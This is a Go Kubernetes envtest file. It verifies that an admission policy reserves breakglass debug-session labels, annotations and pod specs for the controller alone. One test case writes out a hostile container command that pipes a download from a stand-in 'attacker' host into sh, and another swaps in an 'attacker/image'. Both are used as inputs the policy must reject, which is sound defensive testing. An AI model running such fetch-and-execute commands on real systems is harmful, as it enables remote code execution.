// SPDX-FileCopyrightText: 2026 Deutsche Telekom AG
// SPDX-License-Identifier: Apache-2.0

package debug

import (
	"bytes"
	"context"
	"errors"
	"io"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
	appsv1 "k8s.io/api/apps/v1"
	batchv1 "k8s.io/api/batch/v1"
	corev1 "k8s.io/api/core/v1"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
	"k8s.io/apimachinery/pkg/apis/meta/v1/unstructured"
	utilyaml "k8s.io/apimachinery/pkg/util/yaml"
	"k8s.io/client-go/kubernetes"
	"k8s.io/client-go/kubernetes/scheme"
	"k8s.io/client-go/rest"
	"k8s.io/utils/ptr"
	"sigs.k8s.io/controller-runtime/pkg/client"
	"sigs.k8s.io/controller-runtime/pkg/envtest"
)

// TestPlatformRuntimeLabelReservationPolicyEnvtest proves that the optional
// config/components/runtime-label-reservation policy lets only the controller
// (and the kube-controller-manager, for reserved templates) set, change or
// remove the debug-session labels and annotations runtime-security tools key on.
func TestPlatformRuntimeLabelReservationPolicyEnvtest(t *testing.T) {
	if os.Getenv("KUBEBUILDER_ASSETS") == "" {
		t.Skip("KUBEBUILDER_ASSETS required")
	}
	env := &envtest.Environment{}
	cfg, err := env.Start()
	require.NoError(t, err)
	t.Cleanup(func() { require.NoError(t, env.Stop()) })
	admin, err := client.New(cfg, client.Options{Scheme: scheme.Scheme})
	require.NoError(t, err)
	ctx := context.Background()
	const ns = "label-reservation"
	require.NoError(t, admin.Create(ctx, &corev1.Namespace{ObjectMeta: metav1.ObjectMeta{Name: ns}}))

	raw, err := os.ReadFile(filepath.Join("..", "..", "..", "config", "components", "runtime-label-reservation", "policy.yaml"))
	require.NoError(t, err)
	decoder := utilyaml.NewYAMLOrJSONDecoder(bytes.NewReader(raw), 4096)
	for {
		obj := &unstructured.Unstructured{}
		err := decoder.Decode(&obj.Object)
		if errors.Is(err, io.EOF) {
			break
		}
		require.NoError(t, err)
		require.NoError(t, admin.Create(ctx, obj))
	}

	// system:masters skips RBAC, but not admission policies.
	as := func(user string, groups ...string) (client.Client, kubernetes.Interface) {
		impersonated := rest.CopyConfig(cfg)
		impersonated.Impersonate = rest.ImpersonationConfig{UserName: user, Groups: append([]string{"system:masters"}, groups...)}
		c, err := client.New(impersonated, client.Options{Scheme: scheme.Scheme})
		require.NoError(t, err)
		return c, kubernetes.NewForConfigOrDie(impersonated)
	}
	forger, forgerKube := as("tenant@example.com")
	controller, _ := as("system:serviceaccount:breakglass-system:breakglass-manager")
	replicaSetController, _ := as("system:serviceaccount:kube-system:replicaset-controller")

	denied := func(t *testing.T, err error) {
		t.Helper()
		require.Error(t, err)
		assert.Contains(t, err.Error(), "reserved for the breakglass controller")
	}
	pod := func(name string, labels, annotations map[string]string) *corev1.Pod {
		return &corev1.Pod{ObjectMeta: metav1.ObjectMeta{Name: name, Namespace: ns, Labels: labels, Annotations: annotations},
			Spec: corev1.PodSpec{Containers: []corev1.Container{{Name: "c", Image: "busybox"}}}}
	}
	sessionLabel := map[string]string{DebugSessionLabelKey: "s1"}

	// The policy takes effect asynchronously after it is created.
	require.Eventually(t, func() bool {
		err := forger.Create(ctx, pod("probe", sessionLabel, nil), client.DryRunAll)
		return err != nil && strings.Contains(err.Error(), "reserved for the breakglass controller")
	}, 30*time.Second, 200*time.Millisecond, "a forged debug-session label must be rejected")

	t.Run("forged pod labels and annotations are denied", func(t *testing.T) {
		denied(t, forger.Create(ctx, pod("forged-label", sessionLabel, nil)))
		denied(t, forger.Create(ctx, pod("forged-uid", nil, map[string]string{DebugSessionUIDAnnotationKey: "uid"})))
		denied(t, forger.Create(ctx, pod("forged-ephemeral", nil, map[string]string{"breakglass.telekom.com/ephemeral.debugger": "x"})))
		assert.NoError(t, forger.Create(ctx, pod("plain", map[string]string{"app": "x", "breakglass.telekom.com/debug-template": "t"}, nil)),
			"unreserved keys stay usable")
	})

	t.Run("controller and kube-controller-manager may set them", func(t *testing.T) {
		require.NoError(t, controller.Create(ctx, pod("debug", sessionLabel, map[string]string{DebugSessionUIDAnnotationKey: "uid"})))
		require.NoError(t, replicaSetController.Create(ctx, pod("debug-from-template", sessionLabel, nil)))
	})

	t.Run("updates may not add, change or remove reserved keys", func(t *testing.T) {
		mutate := func(name string, change func(*corev1.Pod)) error {
			p := &corev1.Pod{}
			require.NoError(t, admin.Get(ctx, client.ObjectKey{Namespace: ns, Name: name}, p))
			change(p)
			return forger.Update(ctx, p)
		}
		denied(t, mutate("plain", func(p *corev1.Pod) { p.Labels[DebugSessionLabelKey] = "s1" }))
		denied(t, mutate("debug", func(p *corev1.Pod) { p.Labels[DebugSessionLabelKey] = "s2" }))
		denied(t, mutate("debug", func(p *corev1.Pod) { delete(p.Labels, DebugSessionLabelKey) }))
		denied(t, mutate("debug", func(p *corev1.Pod) { delete(p.Annotations, DebugSessionUIDAnnotationKey) }))
		assert.NoError(t, mutate("debug", func(p *corev1.Pod) { p.Labels["team"] = "a" }), "other keys of a debug pod stay editable")

		p := &corev1.Pod{}
		require.NoError(t, admin.Get(ctx, client.ObjectKey{Namespace: ns, Name: "plain"}, p))
		p.Labels[DebugSessionLabelKey] = "s1"
		denied(t, forger.Status().Update(ctx, p))
	})

	t.Run("debug pod specs are frozen for everyone else", func(t *testing.T) {
		addEphemeral := func(name string) error {
			p := &corev1.Pod{}
			require.NoError(t, admin.Get(ctx, client.ObjectKey{Namespace: ns, Name: name}, p))
			p.Spec.EphemeralContainers = append(p.Spec.EphemeralContainers, corev1.EphemeralContainer{
				EphemeralContainerCommon: corev1.EphemeralContainerCommon{Name: "dbg", Image: "busybox", TerminationMessagePolicy: corev1.TerminationMessageReadFile, ImagePullPolicy: corev1.PullAlways}})
			_, err := forgerKube.CoreV1().Pods(ns).UpdateEphemeralContainers(ctx, p.Name, p, metav1.UpdateOptions{})
			return err
		}
		denied(t, addEphemeral("debug"))
		assert.NoError(t, addEphemeral("plain"), "ordinary pods keep kubectl debug")

		p := &corev1.Pod{}
		require.NoError(t, admin.Get(ctx, client.ObjectKey{Namespace: ns, Name: "debug"}, p))
		p.Spec.Containers[0].Image = "attacker/image"
		denied(t, forger.Update(ctx, p))
	})

	t.Run("binding annotations are reserved", func(t *testing.T) {
		require.NoError(t, forger.Create(ctx, pod("to-bind", nil, nil)))
		bind := func(annotations map[string]string) error {
			return forgerKube.CoreV1().Pods(ns).Bind(ctx, &corev1.Binding{
				ObjectMeta: metav1.ObjectMeta{Name: "to-bind", Namespace: ns, Annotations: annotations},
				Target:     corev1.ObjectReference{Kind: "Node", Name: "node-1"}}, metav1.CreateOptions{})
		}
		denied(t, bind(map[string]string{DebugSessionUIDAnnotationKey: "uid"}))
		require.NoError(t, bind(map[string]string{"example.com/scheduled-by": "x"}))
		bound := &corev1.Pod{}
		require.NoError(t, admin.Get(ctx, client.ObjectKey{Namespace: ns, Name: "to-bind"}, bound))
		assert.Equal(t, "node-1", bound.Spec.NodeName)
		assert.NotContains(t, bound.Annotations, DebugSessionUIDAnnotationKey)
	})

	t.Run("workload pod templates are reserved", func(t *testing.T) {
		template := func(labels map[string]string) corev1.PodTemplateSpec {
			return corev1.PodTemplateSpec{ObjectMeta: metav1.ObjectMeta{Labels: labels},
				Spec: corev1.PodSpec{RestartPolicy: corev1.RestartPolicyNever, Containers: []corev1.Container{{Name: "c", Image: "busybox"}}}}
		}
		selected := map[string]string{"app": "w", DebugSessionLabelKey: "s1"}
		selector := &metav1.LabelSelector{MatchLabels: map[string]string{"app": "w"}}
		always := template(selected)
		always.Spec.RestartPolicy = corev1.RestartPolicyAlways
		meta := func(name string) metav1.ObjectMeta { return metav1.ObjectMeta{Name: name, Namespace: ns} }
		for _, obj := range []client.Object{
			&appsv1.Deployment{ObjectMeta: meta("d"), Spec: appsv1.DeploymentSpec{Selector: selector, Template: always}},
			&appsv1.ReplicaSet{ObjectMeta: meta("rs"), Spec: appsv1.ReplicaSetSpec{Selector: selector, Template: always}},
			&appsv1.StatefulSet{ObjectMeta: meta("sts"), Spec: appsv1.StatefulSetSpec{Selector: selector, Template: always}},
			&appsv1.DaemonSet{ObjectMeta: meta("ds"), Spec: appsv1.DaemonSetSpec{Selector: selector, Template: always}},
			&corev1.ReplicationController{ObjectMeta: meta("rc"), Spec: corev1.ReplicationControllerSpec{Selector: map[string]string{"app": "w"}, Template: &always}},
			&batchv1.Job{ObjectMeta: meta("job"), Spec: batchv1.JobSpec{Template: template(selected)}},
			&batchv1.CronJob{ObjectMeta: meta("cron"), Spec: batchv1.CronJobSpec{Schedule: "@daily",
				JobTemplate: batchv1.JobTemplateSpec{Spec: batchv1.JobSpec{Template: template(selected)}}}},
		} {
			t.Run(obj.GetName(), func(t *testing.T) {
				denied(t, forger.Create(ctx, obj.DeepCopyObject().(client.Object), client.DryRunAll))
				assert.NoError(t, controller.Create(ctx, obj.DeepCopyObject().(client.Object), client.DryRunAll))
			})
		}
		plain := &appsv1.Deployment{ObjectMeta: meta("plain"), Spec: appsv1.DeploymentSpec{Selector: selector, Replicas: ptr.To[int32](0),
			Template: func() corev1.PodTemplateSpec {
				p := template(map[string]string{"app": "w"})
				p.Spec.RestartPolicy = corev1.RestartPolicyAlways
				return p
			}()}}
		require.NoError(t, forger.Create(ctx, plain), "templates without reserved keys are unaffected")
		plain.Spec.Template.Labels[DebugSessionLabelKey] = "s1"
		denied(t, forger.Update(ctx, plain))

		// A controller-created debug Deployment: others may scale it and edit
		// its own metadata, but not change what its Pods run.
		debugDeployment := &appsv1.Deployment{ObjectMeta: meta("debug"), Spec: appsv1.DeploymentSpec{Selector: selector, Replicas: ptr.To[int32](0), Template: always}}
		require.NoError(t, controller.Create(ctx, debugDeployment))
		edit := func(change func(*appsv1.Deployment)) error {
			d := &appsv1.Deployment{}
			require.NoError(t, admin.Get(ctx, client.ObjectKeyFromObject(debugDeployment), d))
			change(d)
			return forger.Update(ctx, d)
		}
		assert.NoError(t, edit(func(d *appsv1.Deployment) { d.Spec.Replicas = ptr.To[int32](2) }))
		assert.NoError(t, edit(func(d *appsv1.Deployment) { d.Labels = map[string]string{"team": "a"} }))
		denied(t, edit(func(d *appsv1.Deployment) { d.Spec.Template.Spec.Containers[0].Image = "attacker/image" }))
		denied(t, edit(func(d *appsv1.Deployment) {
			d.Spec.Template.Spec.Containers[0].Command = []string{"sh", "-c", "curl attacker | sh"}
		}))
	})
	// On a spoke reached over OIDC the controller writes as the mapped OIDC
	// username, or is recognised by an OIDC group; both lists are configurable.
	t.Run("OIDC controller identities by username or group", func(t *testing.T) {
		policy := &unstructured.Unstructured{}
		policy.SetAPIVersion("admissionregistration.k8s.io/v1")
		policy.SetKind("ValidatingAdmissionPolicy")
		require.NoError(t, admin.Get(ctx, client.ObjectKey{Name: "breakglass-runtime-label-reservation"}, policy))
		variables, _, err := unstructured.NestedSlice(policy.Object, "spec", "variables")
		require.NoError(t, err)
		require.Equal(t, "controllerUsers", variables[0].(map[string]any)["name"])
		require.Equal(t, "controllerGroups", variables[1].(map[string]any)["name"])
		variables[0].(map[string]any)["expression"] = `["oidc:breakglass-group-sync@service.local"]`
		variables[1].(map[string]any)["expression"] = `["oidc:breakglass-controllers"]`
		require.NoError(t, unstructured.SetNestedSlice(policy.Object, variables, "spec", "variables"))
		require.NoError(t, admin.Update(ctx, policy))

		oidcController, _ := as("oidc:breakglass-group-sync@service.local")
		groupMember, _ := as("oidc:robot@example.com", "oidc:breakglass-controllers")
		otherOIDCUser, _ := as("oidc:robot@example.com", "oidc:tenant-admins")
		// The update takes effect asynchronously: wait until the old
		// ServiceAccount is no longer exempt.
		require.Eventually(t, func() bool {
			err := controller.Create(ctx, pod("sa-probe", sessionLabel, nil), client.DryRunAll)
			return err != nil && strings.Contains(err.Error(), "reserved for the breakglass controller")
		}, 30*time.Second, 200*time.Millisecond, "the replaced user list must apply")
		assert.NoError(t, oidcController.Create(ctx, pod("oidc-user", sessionLabel, nil), client.DryRunAll))
		assert.NoError(t, groupMember.Create(ctx, pod("oidc-group", sessionLabel, nil), client.DryRunAll))
		denied(t, otherOIDCUser.Create(ctx, pod("oidc-other", sessionLabel, nil), client.DryRunAll))
	})
}
